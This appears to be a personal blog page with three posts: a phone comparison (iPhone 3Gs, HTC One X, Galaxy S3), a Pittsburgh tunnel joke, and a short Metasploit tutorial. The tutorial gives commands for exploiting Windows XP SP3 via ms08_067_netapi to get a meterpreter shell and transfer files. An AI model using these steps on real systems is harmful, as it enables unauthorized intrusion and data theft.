iPhone 3Gs vs. HTC One X (AT&T) vs. Samsung Galaxy S3 (AT&T) Experience

Posted on July 7, 2012 by josh



This is a comparison of the three, not by specs, but by my experience while using each device.

I had the iPhone 3Gs for two and a half years. I had jailbroke the device about two hours after I
walked out of the AT&T store. I loved that phone. It did everything I needed to do at the time, but
I hated the idea of being controlled by Apple (hence the jailbreaking.) After jailbreaking
it, I tweaked some settings so that I could have a 5×5 grid rather than the 4×4 (iconoclasm),
changed the icon themes (Winterboard), notification tweaks (BiteSMS), backgrounding
capabilities (backgrounder) which was later released in iOS 4, and have toggles for Wifi and
GPS (sbsettings). Once I had everything set up, the only thing that bothered me about it was
things didn’t work perfectly with the tweaks, which was expected since they are tweaks, and
that Apple didn’t seem to be listening to their customers about what they wanted. We wanted
toggles for Wifi, GPS, Bluetooth, texts to pop-up and be able to reply without leaving an app,
and just have the ability to customize things more. I would constantly update my iOS once a
stable un-tethered jailbreak was released, rejailbreak and then set it up again.Â Did I
mention that I don’t like my personal devices to be controlled and locked down?

My contract with AT&T was up in January 2012, but I decided that I would wait for the iPhone 5,
which was rumored to be released sometime in June at that time. By this time, my phone was
running so slow, that I would have to tap to open my Messages app and wait about 5 seconds, then
tap the thread and wait again. That was driving me crazy, but not enough to unjailbreak and
return to stock. My girlfriend and friends kept saying I needed to get a new phone, but I was
determined to wait. Beside the fact of being restricted, I liked the iPhone. I really like
other Apple products (I am actually typing this on the Mid-2010 MacBook Pro.) Now let me put
this out there now. I am NOT an “Apple Head” or an extreme “Apple-Fanboy.” I will say
that Apple has it’s downfalls, mostly the price, but I do prefer Apple products over others.
I just feel that their operating systems are more stable and secure. Once again, I am NOT
claiming Apple products are flawless. They just don’t catch anything nearly as easily as
Microsoft and Andriod.

Now, to the comparisons I have experienced. First though, I understand that the iPhone 3Gs is
well over two years old. I will be doing the best comparison I can thinking back to how I felt
about the 3Gs when I first walked out of the store, unless I state otherwise.

I really liked how easily the iPhone was to get used to. Everything seems
selfÂ explanatory. Everything that could to be changed was in the “Settings” app. I
didn’t have to look all over the place to change one setting. The initial setup was a breeze. I
did not have my Mac at the time, so I used my Windows 7 Ultimate machine that I built to set it up. No
big deal. I did not like the idea of having so many Apple Daemons running though, such as
“Apple Mobile Device Service” and “iTunes Helper.” Even though I do not believe they
left that big of a footprint in my computer, I still wanted to keep my machine as lean as
possible. I believe I tried to kill the services, but iTunes yelled at me and I didn’t feel
like dealing with it, so I turned them back on.

I only had the HTC One X for about three weeks, so I didn’t get much time to play with it and learn
everything that it offers. At first glance, the phone is beautiful, sleek, and
veryÂ appealingÂ to the eye. The Super IPSÂ screen is huge (4.7in), bright, and
shows every detail. The phone was easy to hold. The matte finish made it easy to hold, even with
sweaty hands. The immediate falt was the fact that there was no SD card slot, and the battery is
not removable. Both were things I was used to because with the iPhone, I was locked in my 16GB
internal and no removable battery. The phone sports a 1.5GHz duel-core Qualcomm Snapdragon
S4 processor, 1GB of RAM, a 1800 mAh battery. I really liked the UI (Sense 4.0) and how
responsive it was… at first. When I first bought it, it was amazingly fast (maybe due to the
fact of how slow my iPhone was.) I then rooted the device (remember? I hate to have my personal
devices controlled and locked) and started to use some apps such as avast! Free Mobile
Security Â for my anti-virusÂ and Cosmos Â for battery control (Friends
recommended those apps.) I then played around looking more into settings and other features
of the phone and came across the task manager. This is where it started to turn south for me. The
phone is spec’d out to have 1GB of RAM. The task manager only showed approx 768MB or RAM, 400MB
of that was being used from the second I turned the device on after uninstalling avast! and
Cosmos. I read that Sense 4.0 is a huge memory hog, but that is because it wraps everything
within Andriod OS into one. ThatÂ upsetÂ me a little bit, but nothing that I wasn’t
used to. I just figured with a whole new OS, things would be completely different. Texting on
this phone was so easy. If the phone didn’t know a word, I could tap add to dictionary, and edit
it any time you want in Settings> Language & Keyboard> HTC Sense Input> Personal Dictionary
(something I hated about the iPhone).Â The HTC One X comes with Beats Audio Â built into
the phone when headphones are used. I never did get a chance to use this feature, but I wish I
would have (I’m a very busy college student.) The screen seemed to be extremely responsive
when the phone wasn’t being bogged down by who-knows-what. Sometimes I would actually have
to hold the power button to get the phone to shut off just so I could unlock it. Another down side
to the One X was the battery life. I used the “Automatically Adjust Brightness” setting,
and I had to charge the phone about half way through the day. I would have the phone off the
charger at 5am, it would sit on standby (GPS, Bluetooth, and Wifi off) until about 10am. Then
very light use from 11:30am-4:30pm (I was in class.) By about 6pm, I was at about 30%. I know that
the screen was the biggest draw of battery power, but that is crazy that it used so much battery
in such a short amount of time. If HTC could solve the hanging issues, SD card, and the battery,
that phone would be perfect.

The Samsung Galaxy S3 (or SIII) Â at first glance looks to me like Samsung didn’t do much
designing. The overall design of the phone looks slightly dated to me, and was hard to hold,
even with relatively dry hands because of the glossy back. The phone is very thin, as is the One
X, but the S3 has a few edges up on the One X, such as RAM, SD card slot, and removable battery. This
phone also has the 1.5GHz duel-core Qualcomm Snapdragon S4 processor, but has 2GB of RAM, 2100
mAh battery that can be replaced, and a slightly larger 4.8in screen. The Screen does not seem
to get as bright as the One X, which is actually fine by me. I can use this phone in the same
scenario as the One X and use it until 10:15pm and still have about 30% rather than the One X being
at 30% by about 4pm.Â The TouchWiz UI seems to be pretty lightweight and is pretty cool to
work with. With no apps running, just weather widget and an animated walpaper, using about
515MB of RAM. Now remember, this phone has 2GB.The nature theme is getting annoying to me
because of the water sounds and will be removed shortly (I have root access.) The phone has a few
motion controls that I find really cool. Two that I use are it can call a contact that you are
currently looking at or texting just by putting the phone up to your ear (while working on my
phone at night, I tend to put the phone on my chest while I’m waiting. I have managed to call my
girlfriend about 3 times, and my uncle once because I was editing his contact information. I
have since then disabled this feature)Â  and mute incoming calls and pause playing sounds
when the screen is on by turning the device glass down on a table. I have the same apps installed
on my S3, avast! and Cosmos, and have yet to have my phone hang on me. I also really like the fact
that TouchWiz has toggles on the notification pulldown bar for Wifi, Bluetooth, GPS, Sound,
Screen rotation lock, Mobile data, Power Saving, Airplane mode, and Sync. Texting on the S3
does not seem to be as easy. It may just be taking a while for the phone to learn how I type, but it
seems to make a lot of mistakes using the predictive text. Editing the user dictionary is also
buried under Settings>Language and Input> Samsung Keyboard Settings> Predictive Text (tap
the name, not the toggle) > My Word List.

This is Andriod in general. The Andriod platform is a little harder to get used to than iOS. With
the iOS, I learned where most things were in the first few days, where as in Andriod, I am still (a
month later) learning my way around. I already expected myself to be searching for the most
simple things anyway. I really like the way Andriod uses the Google Play. For free stuff, you
don’t have to put in a password. I haven’t bought anything yet so I’m not sure what
happens when you do. That was one thing that I did not like about the Apple App Store. One thing I
did like though, was that Apple controls the apps posted. So this means that apps in the App
StoreÂ  should be safe. There were a few times that they slipped up , but for the most part,
they do a good job. Google Play does review their submissions, but they are not as strict.
Whenever a user is about to download and install an application, at the bottom of the
conformation page, there is a list of what permissions that the app will be granted, such as
reading SMS, SD card access. An educated user can look at these permissions and may notice if
something is not right.

 

Overall, I believe I have learned to prefer Andriod OS over iOS because of the customization
and features. As of the writing, I prefer the Samsung Galaxy S3 because of the battery life,
processing power, ability toÂ customizeÂ more, and I also know about the brand better
than HTC. I believe it is personal opinion on which device you choose, but these are my thoughts
on each device. Posted in Tech Stuff | Tagged Andriod , Galaxy , HTC , iOS , iPhone , One , S3 ,

Hacking XP SP3 with BackTrack Using Metasploit

Posted on March 13, 2012 by josh



Shell access hacking in metasploit XP SP3

Enter msconsole.

Use windows/smb/ms08_067_netapi <enter>

show exploits shows what exploits can be used.

set payload windows/meterpreter/bind_tcp <enter>

This will allow you to use meterpreter to connect to the shell of the XP box

Show options <enter>

set RPORT 445 (Optional, but recommended) <enter>

set RHOST (remote host) *the machine you are attacking’s IP address* <enter>

set LHOST (local host) *your backtrack machine’s IP address* <enter>

exploit <enter>

This will give you access into the XP box

if you want shell access, type in shell.

NOTE: when you type in shell, you will need to use DOS commands! dir- will display folder
contents (ls)

To transfer files, you MUST NOT be in meterpreter. If you are in the Windows shell, type
“exit” to get out

Syntax:

download c:\\FILE\PATH\TO\FILE /LOCATION/TO/SAVE/ON/BackTrack

upload /FILE/ON/BackTrack c:\\LOCATION\TO\COPY

For a video, see http://www.youtube.com/watch?v=fj4ckhacLrE except use “set payload
windows/meterpreter/bing_tcp <enter>” for whatever they use for the payload. I’ll
possibly post a video later.

Tunnel Monster

Posted on March 13, 2012 by josh



Well, we all know that Pittsburgh has horrible drivers. The tunnels in and out of Pittsburgh
make things even worse.

Many people wonder why traffic is always backed up going into the tunnels especially the
Squirrel Hill ,Â the Fort Pitt , and The Liberty, “Tubes as us Pittsburghez call them” ,
but when they finally get out, traffic is clear as day. Scientists believe it’s because of
algorithms, vehicles hitting their brakes and not maintaining speed. I believe they are
correct, partially. Many have heard of the tunnel “monsters”. If you haven’t, here is
the original that some people have seen online. (If you know the original creator, please let
me know so they can receive credit. It’s a very nice image.)

Original Tunnel Monster

My cousin, who I believe is my second cousin (I’m not good with family trees), posted on his
website talking about the tunnel monster and how we should search for it, and get help from the
pros . This is a great idea! I know I am tired of waiting in endless traffic for hours, killing my
gas tank, truck, and wallet just to emerge from the tunnels to see nothing but a clear road.
I’d understand the traffic if there was construction going on in or on the other side of the
tunnels (which there will be shortly until the summer of 2014…) , but there is NOTHING going
on. Just people being afraid to actually GO into the tunnels. He posted on a comment I made about
the tunnel monster saying, “I expect your version of the tunnel monster, BTW.” So, below
in the second image is my version.

Disclamer (I do not want sued!): I have nothing against Lady Gaga, I simply was searching for
“Monster” on google, and found the image of her and though her pose was perfect for my
image. Posted in Pittsburgh | Tagged Fort , Hill , Monster , Pit , Pitt , Pittsburgh , Squirrel ,
